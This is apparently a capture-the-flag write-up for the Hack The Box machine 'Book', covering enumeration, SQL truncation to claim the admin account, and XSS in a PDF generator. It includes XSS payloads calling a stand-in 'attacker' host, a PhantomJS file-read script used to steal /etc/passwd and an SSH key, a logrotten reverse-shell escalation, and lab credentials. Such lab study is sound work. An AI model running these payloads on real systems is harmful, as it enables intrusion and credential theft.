## Enumeration

```bash
sudo nmap -sCV -oA bookstyled --stylesheet https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/master/nmap-bootstrap.xsl 10.10.10.176
firefox bookstyled.xml
```

```bash
PORT STATE SERVICE VERSION 
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 
| ssh-hostkey: 
| 2048 f7:fc:57:99:f6:82:e0:03:d6:03:bc:09:43:01:55:b7 (RSA) 
| 256 a3:e5:d1:74:c4:8a:e8:c8:52:c7:17:83:4a:54:31:bd (ECDSA) 
|_ 256 e3:62:68:72:e2:c0:ae:46:67:3d:cb:46:bf:69:b9:6a (ED25519) 
80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) 
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set 
|_http-server-header: Apache/2.4.29 (Ubuntu) 
|_http-title: LIBRARY - Read | Learn | Have Fun 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Based on both the [Apache](https://packages.ubuntu.com/search?keywords=apache2) and [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) versions, this looks like Ubuntu 18.04.

## Web

On the web application we have a login page. There's a login and sing up form. If we try to blindly try to login a js alert window will appear will an error message. We create an account and also test with that same account the message response. The field that is unique is the email so we can have duplicate username accounts but not different users with same email. The message in this case displays "User exists". This could be an entry point for user enumeration. 

After logging we find a library website. There are plenty of tabs to interact with. The interesting one "Books" tab has a list of books which we can download in a pdf form. The link to the download form is `http://10.10.10.176/download.php?file=1`. We can use Repeater for the different ids and read the responses. 

Next, the "Collections" tab has a book submission form. Anything user inputs will pop up a message "thanks for the submission". So if any XSS works we can not view it client-side. To verify this spin up a python web server and input a basic XSS payload to request something of `<img src="http://attacker/fakefile">` open the nc listener to receive the header response. We won't get a hit.

The same for the "Contact" tab. There's a form and any input gives a message window "your message sent". However we get a email leak on the "contact to" field "admin@book.htb"

## Directory Fuzzing
```bash
gobuster dir -u http://10.10.10.176 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 40

/download.php (Status: 302) 
/home.php (Status: 302) 
/profile.php (Status: 302) 
/docs (Status: 301) 
/books.php (Status: 302) 
/feedback.php (Status: 302) 
/admin (Status: 301) <----------------- interesting !
/contact.php (Status: 302) 
/search.php (Status: 302) 
/db.php (Status: 200) 
/index.php (Status: 200) 
/images (Status: 301) 
/logout.php (Status: 302) 
/collections.php (Status: 302) 
/settings.php (Status: 302) 
/server-status (Status: 403)
```

On the admin login page if inspect the source code we find a js script section with an alert for maximum characters on the name and email field. Less than 10 and 20 respectively. 

## SQLi Truncation

Input is truncated (deleted) when added to the database due to surpassing the maximum defined length. The db mgmt system truncates any newly inserted values to fit the width of the designated column size.

We can test this by singing up with an email with longer than 20 characters (e.g. 30). On the login page we can not use the longer version of the email because it has probably been truncated when it was saved on the db. We can still login but with the truncated version of the original 30 string email. 

This means that if we could trick the db on registering a new user and email under "admin@book.htb" we could be granted access on that restricted admin page. We can send the sing up request to burp and proceed from there.

```r
# to surpass the limit of 20 add whitespaces and URL encode (ctrl+u) them
name=james&email=admin%40book.htb++++++&password=password
```

## Admin Panel

We can find downloadable PDF for Users data and Collection data under the "Collections" tab. These are formatted data such as usernames and emails (Users) and tittle, author and link (Collection).

As the normal we had previously created a collection in the "Collections" tab and injected a html tag string. This string was rendered in the Collection PDF on the admin page. These are injectable fields and as far as we know don't have any length limitation like the username and email field. We can further process this to inject a js payload and execute it on the admin panel.

If we inject a XSS payload as before to read the response header we get a hit. Make a collection as normal user with tittle `<img src="http://attacker/test">` and fill the rest fields. On the admin panel and waiting with listener, we click to view the PDF on the collection. We get a response and a User-Agent we leaked information. 

```bash
Ncat: Connection from 10.10.10.176:60208
GET /test HTTP/1.1
Uset-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
[..]
```

Now we can look for vulnerabilities in PhantomJS version 2.1.1. Searching online we find:

```text
PhantomJS through 2.1.1 has an arbitrary file read vulnerability, as demonstrated by an XMLHttpRequest for a file:// URI. The vulnerability exists in the page.open() function of the webpage module, which loads a specified URL and calls a given callback. An attacker can supply a specially crafted HTML file, as user input, that allows reading arbitrary files on the filesystem. For example, if page.render() is the function callback, this generates a PDF or an image of the targeted file. NOTE: this product is no longer developed.
```

## Arbitrary File Read 
Now that we have found the vulnerability we can proceed onto exploiting it. We find this [article](https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/). We can use a simplified version of this method now that we known that we need [XSS to read local files](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf#read-local-file). This is the final payload:

```bash
<script>
x=new XMLHttpRequest;
x.onload=function(){document.write(btoa(this.responseText))}; # remove the btoa function
x.open("GET","file:///etc/passwd");x.send();
</script>
```

Now input this to the book tittle field and fill in the rest, go to the admin collections page and execute the collection PDF. What you'll have now is a PDF but it's contents are the contents of the file that we specified to be read. With this in mind we can steal the low privileged user's private keys, because we known port 22 ssh is open and connect to the filesystem.

Now we have the private key in pdf format so let's convert it to text with `pdftohtml` and then we can grab the key and log on to the filesystem.

## Privilege Escalation

In `/home/reader/`, there’s a folder, `backsups` which has two log files inside and only one has data:

```bash
reader@book:~/backups$ ls -l 
# total 4 
# -rw-r--r-- 1 reader reader 0 Jan 29 13:05 access.log 
# -rw-r--r-- 1 reader reader 91 Jan 29 13:05 access.log.1 

reader@book:~/backups$ cat access.log.1 
# 192.168.0.104 - - [29/Jun/2019:14:39:55 +0000] "GET /robbie03 HTTP/1.1" 404 446 "-" "curl"
```

With the help of `linpeas.sh` with find this related to the log files we found in the backups folder.

```bash
[+] Writtable log files (logrotten)
Writable: /home/reader/backups/access.log
```

And the exploit explaination [here](https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation). 

## Logrotten Race Condition Exploitation

After reading we can start to exploit this:

```bash
# First add some text to the acces.log file
reader@book:~/backups$ echo randomtext > access.log
# After some seconds a new log file appears
reader@book:~/backups$ ls 
access.log access.log.1 access.log.2
```

Reading more in depth of the exploitation a race condition in `logrorate` triggers the following command chain:

```bash
mv access.log.1 access.log2
mv access.log access.log.1
touch access.log # given reader:reader ownership
```

To simply explain this if between the execution of the 2nd and 3rd command we replace `/home/reader/backup` with a symlink to somewhere else, then root will create a file in any folder we want and provide us with ownership of that file. Now imaging the file being a reverse bash tcp payload.

We can do all this with logrotten. Download and tranfer [logrotten](https://github.com/whotwagner/logrotten) to the remote host.

```bash
# create the c executable
reader@book:/dev/shm$ gcc -o logrotten logrotten.c 

# still need to execute the chain of commands in the right order
reader@book:/dev/shm$ echo randomtext >> /home/reader/backups/access.log; ./logrotten -p payload.sh /home/reader/backups/access.log

# wait for a little and a callback will be triggered, note that the root shell will die quickly
```


## Beyond Root

We also find SQL credentials in `db.php`: `book_admin:I_Hate_Book_Reading`.

On `/var/www/html/admin` we can find the `index.php` and the exposing the truncation vulnerability.

On this line:

```bash
$email=trim($row["email"]," "); # developer is using trim to remove whitespaces, which means that the db doesn't itself remove (truncate) the whitespace in the email field.
if ($email==="admin@book.htb")
```

There’s a lot of automated user activity on this box that’s worth taking a look at. All of it starts at the root crontab:

```bash
root@book:~# crontab -l
...[snip]...
# m h  dom mon dow   command
@reboot /root/reset.sh
* * * * * /root/cron_root
*/5 * * * * rm /etc/bash_completion.d/*.log*
*/2 * * * * /root/clean.sh
```

On start up (`@reboot`), root will run `/root/reset.sh` (I added some whitespace for readability):

```bash
#!/bin/sh
while true
do
        /root/log.sh && sleep 5
        if [ -d /home/reader/backups2 ];then
                sleep 5 && \
                rm -rf /home/reader/backups && \
                mv /home/reader/backups2 /home/reader/backups && \
                echo '192.168.0.104 - - [29/Jun/2019:14:39:55 +0000] "GET /robbie03 HTTP/1.1" 404 446 "-" "curl"' > /home/reader/backups/access.log && \
                chown -R reader:reader /home/reader/backups && \
                rm /home/reader/backups/access.log.*
        fi
done
```

This script is an infinite loop that will run `/root/log.sh` and `sleep 5`. Then if there’s a directory `/home/reader/backups2`, it will `sleep 5` again, remove `home/reader/backsups` (presumably the symlink), move `backups2` to `backups`, set `access.log` back to the default value, set the ownership of the directory, and remove any logs beyond the first.

So in addition to cleaning up the exploit I just ran, it’s also running `log.sh` every five seconds:

```bash
#!/bin/sh
/usr/sbin/logrotate -f /root/log.cfg
```

That’s the source of the `logrotate` call. I can now see the config as well:

```bash
/home/reader/backups/access.log {
        daily
        rotate 12
        missingok
        notifempty
        size 1k
        create
}
```

`notifempty` shows why it doesn’t rotate until I write something to it.

The second cron is `/root/root_cron` every minute:

```bash
#!/usr/bin/expect -f
spawn ssh -i .ssh/id_rsa localhost
expect eof
exit
```

This is an [expect script](https://en.wikipedia.org/wiki/Expect) to have root login, which will run the bash completion script.

The third cron just clears anything `.log` out of the bash completion directory, again, cleaning up after the known exploit.

The fourth cron runs `clean.sh` every two minutes:

```bash
#!/bin/sh
mysql book -e "delete from users where email='admin@book.htb' and password<>'Sup3r_S3cur3_P455';"
mysql book -e "delete from collections where email!='egotisticalSW_was_here@book.htb';"
```

This is what was cleaning up the database when I was working with it earlier. It removes all extra admin@book.htb users except the original one (I can see now the actual password), and it removes all the collections except those from `egotisticalSW_was_here@book.htb`, which are the default four

## Mitigations

XSS: Input sanitization.
SQLi Truncation: Use a separate privileged user column. Less obvious target usernames.
SQLi: Use of prepared statements (with Parameterized queries), use of stored procedures, allow-list input validation, escaping all user supplied input.
SSRF: Updating/patching. In this case changing the PDF generating software.